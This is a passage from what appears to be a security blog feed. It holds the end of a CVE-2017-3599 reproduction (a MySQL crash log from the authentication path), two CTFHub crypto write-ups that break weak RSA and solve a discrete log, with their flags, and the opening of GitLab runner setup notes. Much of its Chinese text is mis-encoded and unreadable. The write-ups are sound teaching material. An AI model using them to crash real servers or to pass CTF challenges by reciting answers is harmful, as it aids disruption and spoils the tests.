using CPU crc32 instructions</span><br><span class="line">2023-12-19 12:19:44 1 [Note] InnoDB: Initializing buffer pool, size = 128.0M</span><br><span class="line">2023-12-19 12:19:44 1 [Note] InnoDB: Completed initialization of buffer pool</span><br><span class="line">2023-12-19 12:19:44 1 [Note] InnoDB: Highest supported file format is Barracuda.</span><br><span class="line">2023-12-19 12:19:44 1 [Note] InnoDB: 128 rollback segment(s) are active.</span><br><span class="line">2023-12-19 12:19:44 1 [Note] InnoDB: Waiting <span class="keyword">for</span> purge to start</span><br><span class="line">2023-12-19 12:19:44 1 [Note] InnoDB: 5.6.35 started; <span class="built_in">log</span> sequence number 1625997</span><br><span class="line">2023-12-19 12:19:44 1 [Note] Server hostname (bind-address): <span class="string">&#x27;*&#x27;</span>; port: 3306</span><br><span class="line">2023-12-19 12:19:44 1 [Note] IPv6 is available.</span><br><span class="line">2023-12-19 12:19:44 1 [Note]   - <span class="string">&#x27;::&#x27;</span> resolves to <span class="string">&#x27;::&#x27;</span>;</span><br><span class="line">2023-12-19 12:19:44 1 [Note] Server socket created on IP: <span class="string">&#x27;::&#x27;</span>.</span><br><span class="line">2023-12-19 12:19:44 1 [Warning] <span class="string">&#x27;proxies_priv&#x27;</span> entry <span class="string">&#x27;@ root@100bfe039d09&#x27;</span> ignored <span class="keyword">in</span> --skip-name-resolve mode.</span><br><span class="line">2023-12-19 12:19:44 1 [Note] Event Scheduler: Loaded 0 events</span><br><span class="line">2023-12-19 12:19:44 1 [Note] mysqld: ready <span class="keyword">for</span> connections.</span><br><span class="line">Version: <span class="string">&#x27;5.6.35&#x27;</span>  socket: <span class="string">&#x27;/var/run/mysqld/mysqld.sock&#x27;</span>  port: 3306  MySQL Community Server (GPL)</span><br><span class="line">12:21:29 UTC - mysqld got signal 11 ;</span><br><span class="line">This could be because you hit a bug. It is also possible that this binary</span><br><span class="line">or one of the libraries it was linked against is corrupt, improperly built,</span><br><span class="line">or misconfigured. This error can also be caused by malfunctioning hardware.</span><br><span class="line">We will try our best to scrape up some info that will hopefully <span class="built_in">help</span></span><br><span class="line">diagnose the problem, but since we have already crashed, </span><br><span class="line">something is definitely wrong and this may fail.</span><br><span class="line"></span><br><span class="line">key_buffer_size=8388608</span><br><span class="line">read_buffer_size=131072</span><br><span class="line">max_used_connections=1</span><br><span class="line">max_threads=151</span><br><span class="line">thread_count=1</span><br><span class="line">connection_count=1</span><br><span class="line">It is possible that mysqld could use up to </span><br><span class="line">key_buffer_size + (read_buffer_size + sort_buffer_size)*max_threads = 68108 K  bytes of memory</span><br><span class="line">Hope that<span class="string">&#x27;s ok; if not, decrease some variables in the equation.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Thread pointer: 0x23d86c0</span></span><br><span class="line"><span class="string">Attempting backtrace. You can use the following information to find out</span></span><br><span class="line"><span class="string">where mysqld died. If you see no messages after this, something went</span></span><br><span class="line"><span class="string">terribly wrong...</span></span><br><span class="line"><span class="string">stack_bottom = 7f3ca45a1e98 thread_stack 0x40000</span></span><br><span class="line"><span class="string">mysqld(my_print_stacktrace+0x2c)[0x8c3d5c]</span></span><br><span class="line"><span class="string">mysqld(handle_fatal_signal+0x481)[0x661df1]</span></span><br><span class="line"><span class="string">/lib/x86_64-linux-gnu/libpthread.so.0(+0xf890)[0x7f3ccee40890]</span></span><br><span class="line"><span class="string">/lib/x86_64-linux-gnu/libc.so.6(memchr+0x78)[0x7f3ccd885cd8]</span></span><br><span class="line"><span class="string">mysqld[0x672dc4]</span></span><br><span class="line"><span class="string">mysqld[0x683e2d]</span></span><br><span class="line"><span class="string">mysqld[0x68433e]</span></span><br><span class="line"><span class="string">mysqld[0x6730a9]</span></span><br><span class="line"><span class="string">mysqld[0x6724df]</span></span><br><span class="line"><span class="string">mysqld(_Z16acl_authenticateP3THDj+0x1bd)[0x68450d]</span></span><br><span class="line"><span class="string">mysqld[0x6abe17]</span></span><br><span class="line"><span class="string">mysqld(_Z16login_connectionP3THD+0x42)[0x6acbe2]</span></span><br><span class="line"><span class="string">mysqld(_Z22thd_prepare_connectionP3THD+0x19)[0x6ad329]</span></span><br><span class="line"><span class="string">mysqld(_Z24do_handle_one_connectionP3THD+0x11c)[0x6ad49c]</span></span><br><span class="line"><span class="string">mysqld(handle_one_connection+0x40)[0x6ad570]</span></span><br><span class="line"><span class="string">mysqld(pfs_spawn_thread+0x146)[0x8fa106]</span></span><br><span class="line"><span class="string">/lib/x86_64-linux-gnu/libpthread.so.0(+0x8064)[0x7f3ccee39064]</span></span><br><span class="line"><span class="string">/lib/x86_64-linux-gnu/libc.so.6(clone+0x6d)[0x7f3ccd8e962d]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Trying to get some variables.</span></span><br><span class="line"><span class="string">Some pointers may be invalid and cause the dump to abort.</span></span><br><span class="line"><span class="string">Query (0): Connection ID (thread ID): 1</span></span><br><span class="line"><span class="string">Status: NOT_KILLED</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The manual page at http://dev.mysql.com/doc/mysql/en/crashing.html contains</span></span><br><span class="line"><span class="string">information that should help you find out what is causing the crash.</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>æ¼æ´å¤ç°</category>
      </categories>
      <tags>
        <tag>CVE-2017-3599</tag>
      </tags>
  </entry>
  <entry>
    <title>WriteUp-CTFHub-Rivest Shamir Adleman</title>
    <url>/2024/01/25/WriteUp-CTFHub-Rivest-Shamir-Adleman/</url>
    <content><![CDATA[<span id="more"></span>


<h2 id="é¢˜ç›®è€ƒç‚¹"><a href="#é¢˜ç›®è€ƒç‚¹" class="headerlink" title="é¢˜ç›®è€ƒç‚¹"></a>é¢˜ç›®è€ƒç‚¹</h2><ul>
<li>RSA</li>
</ul>
<h2 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h2><ul>
<li>ä¸‹è½½é¢˜ç›®é™„ä»¶ï¼Œè§£å‹åå¾—åˆ°nï¼Œeï¼Œcï¼š  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">n = 408579146706567976063586763758203051093687666875502812646277701560732347095463873824829467529879836457478436098685606552992513164224712398195503564207485938278827523972139196070431397049700119503436522251010430918143933255323117421712000644324381094600257291929523792609421325002527067471808992410166917641057703562860663026873111322556414272297111644069436801401012920448661637616392792337964865050210799542881102709109912849797010633838067759525247734892916438373776477679080154595973530904808231</span><br><span class="line">e = 65537</span><br><span class="line">c = 226582271940094442087193050781730854272200420106419489092394544365159707306164351084355362938310978502945875712496307487367548451311593283589317511213656234433015906518135430048027246548193062845961541375898496150123721180020417232872212026782286711541777491477220762823620612241593367070405349675337889270277102235298455763273194540359004938828819546420083966793260159983751717798236019327334525608143172073795095665271013295322241504491351162010517033995871502259721412160906176911277416194406909</span><br></pre></td></tr></table></figure></li>
<li>é€šè¿‡åœ¨çº¿å·¥å…·<a href="http://factordb.com/">factordb</a>åˆ†è§£nï¼Œå¾—åˆ°pï¼Œqï¼š  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p = 15485863</span><br><span class="line">q = 26384008867091745294633354547835212741691416673097444594871961708606898246191631284922865941012124184327243247514562575750057530808887589809848089461174100421708982184082294675500577336225957797988818721372546749131380876566137607036301473435764031659085276159909447255824316991731559776281695919056426990285120277950325598700770588152330565774546219611360167747900967511378709576366056727866239359744484343099322440674434020874200594041033926202578941508969596229398159965581521326643115137</span><br></pre></td></tr></table></figure></li>
<li>ç¼–å†™RSAè§£å¯†è„šæœ¬ï¼š  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="comment"># å·²çŸ¥å‚æ•°</span></span><br><span class="line">p = <span class="number">15485863</span></span><br><span class="line">q = <span class="number">26384008867091745294633354547835212741691416673097444594871961708606898246191631284922865941012124184327243247514562575750057530808887589809848089461174100421708982184082294675500577336225957797988818721372546749131380876566137607036301473435764031659085276159909447255824316991731559776281695919056426990285120277950325598700770588152330565774546219611360167747900967511378709576366056727866239359744484343099322440674434020874200594041033926202578941508969596229398159965581521326643115137</span></span><br><span class="line">n = <span class="number">408579146706567976063586763758203051093687666875502812646277701560732347095463873824829467529879836457478436098685606552992513164224712398195503564207485938278827523972139196070431397049700119503436522251010430918143933255323117421712000644324381094600257291929523792609421325002527067471808992410166917641057703562860663026873111322556414272297111644069436801401012920448661637616392792337964865050210799542881102709109912849797010633838067759525247734892916438373776477679080154595973530904808231</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">226582271940094442087193050781730854272200420106419489092394544365159707306164351084355362938310978502945875712496307487367548451311593283589317511213656234433015906518135430048027246548193062845961541375898496150123721180020417232872212026782286711541777491477220762823620612241593367070405349675337889270277102235298455763273194540359004938828819546420083966793260159983751717798236019327334525608143172073795095665271013295322241504491351162010517033995871502259721412160906176911277416194406909</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡ç®—phi(n)</span></span><br><span class="line">phi_n = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡ç®—d</span></span><br><span class="line">d = gmpy2.invert(e, phi_n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è§£å¯†å¾—åˆ°m</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line">plaintext = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(plaintext)</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">csictf&#123;sh0uld&#x27;v3_t4k3n_b1gg3r_pr1m3s&#125;</span><br><span class="line"># CTFHubå¹³å°ä¼¼ä¹æœ‰é—®é¢˜ï¼Œæäº¤flagåæ˜¾ç¤ºä¸ºé”™è¯¯ï¼Œä½†æ˜¯flagæ˜¯æ­£ç¡®çš„</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF-WriteUp</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>WriteUp-CTFHub-you raise me up</title>
    <url>/2024/02/06/WriteUp-CTFHub-you-raise-me-up/</url>
    <content><![CDATA[<span id="more"></span>

<h2 id="é¢˜ç›®è€ƒç‚¹"><a href="#é¢˜ç›®è€ƒç‚¹" class="headerlink" title="é¢˜ç›®è€ƒç‚¹"></a>é¢˜ç›®è€ƒç‚¹</h2><ul>
<li>ç¦»æ•£å¯¹æ•°</li>
</ul>
<h2 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h2><ul>
<li>ä¸‹è½½é¢˜ç›®é™„ä»¶ï¼š  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">n = <span class="number">2</span> ** <span class="number">512</span>    <span class="comment"># 2^512</span></span><br><span class="line">m = random.randint(<span class="number">2</span>, n-<span class="number">1</span>) | <span class="number">1</span>  <span class="comment"># éšæœºç”Ÿæˆä¸€ä¸ªå¥‡æ•°ï¼ˆä½¿ç”¨random.randint()å‡½æ•°ç”Ÿæˆä¸€ä¸ªå¤§äºç­‰äº2ä¸”å°äºn-1çš„éšæœºæ•´æ•°ï¼Œå¹¶é€šè¿‡æŒ‰ä½æˆ–æ“ä½œç¬¦&quot;| 1&quot;å°†å…¶è½¬æ¢ä¸ºå¥‡æ•°ï¼‰</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, bytes_to_long(flag), n)  <span class="comment"># c = m^flag mod n</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;m = &#x27;</span> + <span class="built_in">str</span>(m)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;c = &#x27;</span> + <span class="built_in">str</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># m = 391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075</span></span><br><span class="line"><span class="comment"># c = 6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499</span></span><br></pre></td></tr></table></figure></li>
<li>å¯¹äº<code>c = m^flag mod n</code>ï¼Œå·²çŸ¥cï¼Œmï¼Œnï¼Œæ±‚flagï¼Œè¿™æ˜¯å…¸å‹çš„ç¦»æ•£å¯¹æ•°é—®é¢˜ã€‚</li>
<li>ä½¿ç”¨sympyåº“è¿›è¡Œæ±‚è§£ï¼š  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy.ntheory <span class="keyword">import</span> discrete_log  <span class="comment"># conda update sympy</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes    <span class="comment"># pip install pycryptodome</span></span><br><span class="line">m = <span class="number">391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075</span></span><br><span class="line">c = <span class="number">6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499</span></span><br><span class="line">n = <span class="number">2</span> ** <span class="number">512</span></span><br><span class="line"></span><br><span class="line">flag=discrete_log(n, c, m)  <span class="comment"># æ±‚è§£ç¦»æ•£å¯¹æ•°</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> long_to_bytes(flag)</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;5f95ca93-1594-762d-ed0b-a9139692cb4a&#125;</span><br></pre></td></tr></table></figure>

<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul>
<li><a href="https://geek.csdn.net/65bf0517b8e5f01e1e45ee3d.html?dp_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MTE1MDY0MSwiZXhwIjoxNzA3ODE4ODQwLCJpYXQiOjE3MDcyMTQwNDAsInVzZXJuYW1lIjoid2VpeGluXzQzNjk0MjI3In0.aWF6bJIklpo13OKZ1nCptqIYY6aOcOfjf-FBMc02mr8">2020ç½‘é¼æ¯â€”â€”you_raise_me_up wp_å®‰å…¨_lnjoy-CSDNå­¦ä¹ ç¤¾åŒº</a></li>
<li><a href="https://blog.csdn.net/qq_40648358/article/details/106045483">ä½¿ç”¨sagemathçš„è§£æ³•</a></li>
<li><a href="https://docs.sympy.org/latest/install.html#anaconda">Installation - SymPy 1.12 documentation</a></li>
<li><a href="https://blog.csdn.net/wukai0909/article/details/109772278">from Crypto.Util.number import * ImportError: No module named Crypto.Util.number-CSDNåšå®¢</a></li>
</ul>
]]></content>
      <categories>
        <category>CTF-WriteUp</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Gitlab Group Runneré…ç½®åŠç›¸å…³é—®é¢˜è®°å½•</title>
    <url>/2024/02/19/Gitlab%E5%85%B1%E4%BA%ABrunner%E9%85%8D%E7%BD%AE%E5%8F%8A%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<span id="more"></span>

<h2 id="CI-CDæ¦‚è¿°"><a href="#CI-CDæ¦‚è¿°" class="headerlink" title="CI&#x2F;CDæ¦‚è¿°"></a>CI&#x2F;CDæ¦‚è¿°</h2><ul>
<li>CI&#x2F;CDæ˜¯æŒ‡æŒç»­é›†æˆï¼ˆContinuous Integrationï¼‰å’ŒæŒç»­äº¤ä»˜ï¼ˆContinuous Deliveryï¼‰ã€‚</li>
<li>CI&#x2F;CDæ˜¯ä¸€ç§æŒç»­çš„è½¯ä»¶å¼€å‘æ–¹æ³•ï¼Œå¯ä»¥åœ¨å…¶ä¸­æŒç»­æ„å»ºã€æµ‹è¯•ã€éƒ¨ç½²å’Œç›‘è§†è¿­ä»£ä»£ç æ›´æ”¹ã€‚</li>
<li>è¿™ç§è¿­ä»£è¿‡ç¨‹æœ‰åŠ©äºå‡å°‘åŸºäºé”™è¯¯æˆ–å¤±è´¥çš„å°±ç‰ˆæœ¬å¼€å‘æ–°ä»£ç çš„æœºä¼šã€‚GitLab CI&#x2F;CDå¯ä»¥åœ¨å¼€å‘å‘¨æœŸçš„æ—©æœŸæ•è·bugï¼Œå¹¶å¸®åŠ©ç¡®ä¿éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒçš„æ‰€æœ‰ä»£ç éƒ½ç¬¦åˆè‡ªå®šçš„ä»£ç æ ‡å‡†ã€‚</li>
</ul>
<h2 id="å¸¸ç”¨æœ¯è¯­"><a href="#å¸¸ç”¨æœ¯è¯­" class="headerlink" title="å¸¸ç”¨æœ¯è¯­"></a>å¸¸ç”¨æœ¯è¯­</h2><ul>
<li><code>.gitlab-ci.yml</code>ï¼š<ul>
<li>CI&#x2F;CDé…ç½®æ–‡ä»¶ï¼Œå¯ä»¥åœ¨é¡¹ç›®çš„æ ¹ç›®å½•ä¸­åˆ›å»ºï¼Œç”¨äºå®šä¹‰CI&#x2F;CDæµç¨‹</li>
<li>æ­¤æ–‡ä»¶éµå¾ª<code>YAML</code>æ ¼å¼ï¼Œå­˜åœ¨è‡ªå·±çš„è¯­æ³•è§„åˆ™ã€‚</li>
</ul>
</li>
<li><code>Runners</code>ï¼š<ul>
<li>Runneræ˜¯æ‰§è¡ŒCI&#x2F;CDä½œä¸šçš„å®ä½“ã€‚</li>
<li>Runnerå¯ä»¥æ˜¯ä¸€ä¸ªè™šæ‹Ÿæœºã€å®¹å™¨æˆ–è€…ç‰©ç†æœºå™¨ã€‚Runnerå¯ä»¥åœ¨GitLabå®ä¾‹ä¸­çš„æ‰€æœ‰ç»„å’Œé¡¹ç›®ä¸­ä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥åœ¨ç‰¹å®šç»„æˆ–é¡¹ç›®ä¸­ä½¿ç”¨ã€‚</li>
</ul>
</li>
<li><code>Pipelines</code>ï¼šPipelinesç”±jobså’Œstagesç»„æˆ:<ul>
<li><code>Jobs</code>ï¼šå®šä¹‰äº†CI&#x2F;CDæµç¨‹ä¸­çš„ä¸€ä¸ªä»»åŠ¡ã€‚æ¯ä¸ªjobéƒ½æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„å®ä½“ï¼Œå¯ä»¥åœ¨ä¸åŒçš„runnerä¸Šè¿è¡Œã€‚</li>
<li><code>Stages</code>ï¼šå®šä¹‰äº†CI&#x2F;CDæµç¨‹ä¸­çš„ä¸€ä¸ªé˜¶æ®µã€‚æ¯ä¸ªstageåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªjobã€‚å…¸å‹çš„stagesåŒ…æ‹¬<code>build</code>ã€<code>test</code>ã€<code>deploy</code>ç­‰ã€‚</li>
</ul>
</li>
<li><code>CI/CD variables</code>ï¼šå¯ä»¥ç”¨äºpipelineé…ç½®å’Œjobé…ç½®çš„ç¯å¢ƒå˜é‡ã€‚å¯ä»¥åœ¨<code>.gitlab-ci.yml</code>æ–‡ä»¶ä¸­å®šä¹‰ï¼Œä¹Ÿå¯ä»¥åœ¨GitLabä¸­çš„<code>Settings-&gt;CI/CD-&gt;Variables</code>ä¸­å®šä¹‰ã€‚</li>
<li><code>CI/CD components</code></li>
</ul>
<h2 id="Runnerçš„ç±»å‹"><a href="#Runnerçš„ç±»å‹" class="headerlink" title="Runnerçš„ç±»å‹"></a>Runnerçš„ç±»å‹</h2><ul>
<li>GitLab Runneræœ‰ä»¥ä¸‹ç±»å‹ï¼š<ul>
<li>Instance Runnersï¼šé€‚ç”¨äºGitLabå®ä¾‹ä¸­çš„æ‰€æœ‰ç»„å’Œé¡¹ç›®ã€‚</li>
<li>Group Runnersï¼šå¯ç”¨äºç»„ä¸­çš„æ‰€æœ‰é¡¹ç›®å’Œå­ç»„ã€‚</li>
<li>Project Runnersï¼šä¸å…·ä½“é¡¹ç›®æœ‰å…³ã€‚é€šå¸¸<code>project runner</code>ä¸€æ¬¡åªç”±ä¸€ä¸ªé¡¹ç›®ä½¿ç”¨ã€‚</li>
</ul>
</li>
</ul>
<h3 id="Instance-Runner"><a href="#Instance-Runner" class="headerlink" title="Instance Runner"></a>Instance Runner</h3><ul>
<li><p>å½“æœ‰å¤šä¸ªå…·æœ‰ç±»ä¼¼è¦æ±‚çš„ä½œä¸šæ—¶ï¼Œå¯ä»¥ä½¿ç”¨Instance Runnerã€‚ä¸å…¶è®©å¤šä¸ªrunnerä¸ºå¤šä¸ªé¡¹ç›®ç©ºé—²ï¼Œä¸å¦‚è®©å‡ ä¸ªrunnerå¤„ç†å¤šä¸ªé¡¹ç›®ã€‚</p>
</li>
<li><p>å¦‚æœä½¿ç”¨çš„æ˜¯è‡ªç®¡ç†çš„GitLabå®ä¾‹ï¼Œç®¡ç†å‘˜ï¼ˆAdministratorï¼‰å¯ä»¥ï¼š</p>
<ul>
<li>å®‰è£…GitLab Runnerå¹¶æ³¨å†Œä¸€ä¸ªå®ä¾‹è¿è¡Œå™¨ã€‚</li>
<li>ä¸ºæ¯ä¸ªç»„é…ç½®å®ä¾‹è¿è¡Œç¨‹åºè®¡ç®—åˆ†é’Ÿæ•°çš„æœ€å¤§å€¼ã€‚</li>
</ul>
</li>
<li><p>å¦‚æœä½¿ç”¨çš„æ˜¯GitLab.comï¼š</p>
<ul>
<li>å¯ä»¥ä»GitLabç»´æŠ¤çš„å®ä¾‹è¿è¡Œå™¨åˆ—è¡¨ä¸­è¿›è¡Œé€‰æ‹©ã€‚</li>
<li>å®ä¾‹è¿è¡Œè€…æ¶ˆè€—å¸æˆ·ä¸­åŒ…å«çš„è®¡ç®—åˆ†é’Ÿæ•°ã€‚</li>
</ul>
</li>
<li><p>å¿…è¦æ¡ä»¶ï¼š</p>
<ul>
<li>å¿…é¡»æ˜¯Administratorè§’è‰²ã€‚</li>
</ul>
</li>
</ul>
<h3 id="Group-Runner"><a href="#Group-Runner" class="headerlink" title="Group Runner"></a>Group Runner</h3><ul>
<li>å½“æ‚¨å¸Œæœ›ç»„ä¸­çš„æ‰€æœ‰é¡¹ç›®éƒ½å¯ä»¥è®¿é—®ä¸€ç»„runneræ—¶ï¼Œè¯·ä½¿ç”¨group runnerã€‚</li>
<li>ç»„è¿è¡Œè€…ä½¿ç”¨å…ˆè¿›å…ˆå‡ºé˜Ÿåˆ—å¤„ç†ä½œä¸šã€‚</li>
<li>å¿…è¦æ¡ä»¶ï¼š<ul>
<li>å¿…é¡»æ˜¯ç›®æ ‡ç»„çš„Ownerè§’è‰²ã€‚</li>
</ul>
</li>
</ul>
<h3 id="Project-Runner"><a href="#Project-Runner" class="headerlink" title="Project Runner"></a>Project Runner</h3><ul>
<li><p>å½“å¸Œæœ›å°†runnerç”¨äºç‰¹å®šé¡¹ç›®æ—¶ï¼Œä½¿ç”¨project runnerã€‚</p>
</li>
<li><p>ç‰¹å®šé¡¹ç›®ä¸€èˆ¬å…·æœ‰ä»¥ä¸‹ç‰¹å¾ï¼š</p>
<ul>
<li>å…·æœ‰ç‰¹å®šè¦æ±‚çš„ä½œä¸šï¼Œå¦‚éœ€è¦å‡­æ®çš„éƒ¨ç½²ä½œä¸šã€‚</li>
<li>å…·æœ‰å¤§é‡CIæ´»åŠ¨çš„é¡¹ç›®ï¼Œå¯ä»¥ä»ä¸å…¶ä»–è·‘æ­¥è€…çš„åˆ†ç¦»ä¸­å—ç›Šã€‚</li>
</ul>
</li>
<li><p>project runnerä½¿ç”¨å…ˆè¿›å…ˆå‡ºé˜Ÿåˆ—å¤„ç†ä½œä¸šã€‚</p>
</li>
<li><p>å¿…è¦æ¡ä»¶ï¼š</p>
<ul>
<li>å¿…é¡»æ˜¯ç›®æ ‡ç»„çš„Maintainerè§’è‰²ã€‚</li>
</ul>
</li>
</ul>
<h2 id="â­Group-Runner-é…ç½®åŠä½¿ç”¨"><a href="#â­Group-Runner-é…ç½®åŠä½¿ç”¨" class="headerlink" title="â­Group Runner é…ç½®åŠä½¿ç”¨"></a>â­Group Runner é…ç½®åŠä½¿ç”¨</h2><h3 id="åˆ›å»ºgroup-runner"><a href="#åˆ›å»ºgroup-runner" class="headerlink" title="åˆ›å»ºgroup runner"></a>åˆ›å»ºgroup runner</h3><ul>
<li>é¦–å…ˆç¡®è®¤å…·å¤‡ç›®æ ‡ç»„çš„<code>Owner</code>æƒé™ã€‚</li>
<li>åœ¨ç›®æ ‡ç»„çš„ä¾§è¾¹æ é€‰æ‹©<code>Builds-&gt;Runners</code>ã€‚</li>
<li>å¯ä»¥çœ‹åˆ°<code>Runners</code>ä¸­æœ‰<code>Group Runners</code>å’Œ<code>Project Runners</code>ï¼Œé€‰æ‹©<code>New group runner</code>ã€‚</li>
<li>é€‰æ‹©å®‰è£…<code>GitLab Runner</code>çš„æ“ä½œç³»ç»Ÿã€‚</li>
<li>åœ¨<code>Tags</code>ä¸­è¾“å…¥ä½œä¸šæ ‡ç­¾ï¼Œå¯ä»¥æŒ‡å®šæŸäº›ä½œä¸šåªèƒ½åœ¨å¸¦æœ‰ç‰¹å®šæ ‡ç­¾çš„<code>runner</code>ä¸Šè¿è¡Œã€‚</li>
<li>å‹¾é€‰<code>Run untagged jobs</code>ï¼Œå…è®¸è¿è¡Œæ²¡æœ‰æ ‡ç­¾çš„ä½œä¸šã€‚</li>
<li>ï¼ˆå¯é€‰ï¼‰åœ¨<code>Runner description</code>ä¸­ï¼Œå¯ä»¥æ·»åŠ ä¸€ä¸ªåœ¨<code>GitLab</code>ä¸­æ˜¾ç¤ºçš„<code>runner</code>æè¿°ã€‚</li>
<li>ï¼ˆå¯é€‰ï¼‰åœ¨<code>Configuration</code>éƒ¨åˆ†å¯ä»¥é€‰æ‹©å…¶ä»–é…ç½®ï¼Œä¾‹å¦‚æœ€å¤§ä½œä¸šè¶…æ—¶æ—¶é—´ã€‚</li>
<li>é€‰æ‹©<code>Create runner</code></li>
<li>æ³¨å†Œ<code>runner</code>(åœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œ)ï¼š<ul>
<li>é¦–å…ˆéœ€è¦åœ¨ç›®æ ‡æœºå™¨ä¸Šå®‰è£…<code>GitLab Runner</code>ï¼Œæ‰§è¡Œ<code>apt install gitlab-runner</code>ã€‚ã€BUG1ã€‘</li>
<li>æ‰§è¡Œ<code>gitlab-runner register</code>å‘½ä»¤ï¼ŒæŒ‰ç…§æç¤ºè¾“å…¥ç›¸å…³ä¿¡æ¯ï¼ŒåŒ…æ‹¬<code>GitLab instance URL</code>ã€<code>Runner token</code>ç­‰ã€‚ã€BUG2ã€‘</li>
<li>åœ¨é€‰æ‹©<code>executor</code>æ—¶ï¼Œå¯ä»¥é€‰æ‹©<code>shell</code>ã€<code>docker</code>ã€<code>docker+machine</code>ç­‰ã€‚<ul>
<li>å½“é€‰æ‹©<code>shell</code>æ—¶ï¼Œ<code>runner</code>ä¼šåœ¨ç›®æ ‡æœºå™¨ä¸Šç›´æ¥æ‰§è¡Œä½œä¸šã€‚</li>
<li>å½“é€‰æ‹©<code>docker</code>æ—¶ï¼Œ<code>runner</code>ä¼šåœ¨<code>docker</code>å®¹å™¨ä¸­æ‰§è¡Œä½œä¸šï¼Œå› æ­¤éœ€è¦ç¡®ä¿ç›®æ ‡æœºå™¨ä¸Šå·²ç»å®‰è£…äº†<code>docker</code>ã€‚ã€BUG3&amp;BUG4ã€‘</li>
</ul>
</li>
</ul>
</li>
<li>æ³¨å†ŒæˆåŠŸåï¼Œå¯ä»¥åœ¨gitlabå¹³å°çœ‹åˆ°æ–°æ³¨å†Œçš„<code>Group Runner</code>ã€‚</li>
</ul>
<h3 id="æŸ¥çœ‹-æš‚åœ-æ¢å¤-åˆ é™¤-æ¸…ç†group-runner"><a href="#æŸ¥çœ‹-æš‚åœ-æ¢å¤-åˆ é™¤-æ¸…ç†group-runner" class="headerlink" title="æŸ¥çœ‹&#x2F;æš‚åœ&#x2F;æ¢å¤&#x2F;åˆ é™¤&#x2F;æ¸…ç†group runner"></a>æŸ¥çœ‹&#x2F;æš‚åœ&#x2F;æ¢å¤&#x2F;åˆ é™¤&#x2F;æ¸…ç†group runner</h3><ul>
<li>æŸ¥çœ‹:<ul>
<li>å¿…è¦æ¡ä»¶ï¼š<code>Maintainer of the group</code> &#x2F; <code>Owner of the group</code></li>
<li>åœ¨<code>Group sidebar-&gt;Builds-&gt;Runners</code>ä¸­å¯ä»¥çœ‹åˆ°æ‰€æœ‰çš„group runnerï¼Œåœ¨è¯¥ç»„çš„æ¯ä¸€ä¸ªé¡¹ç›®çš„<code>Settings-&gt;CI/CD-&gt;Runners</code>ä¸­ä¹Ÿå¯ä»¥çœ‹åˆ°æ‰€æœ‰çš„group runnerã€‚</li>
</ul>
</li>
<li>æš‚åœï¼š<ul>
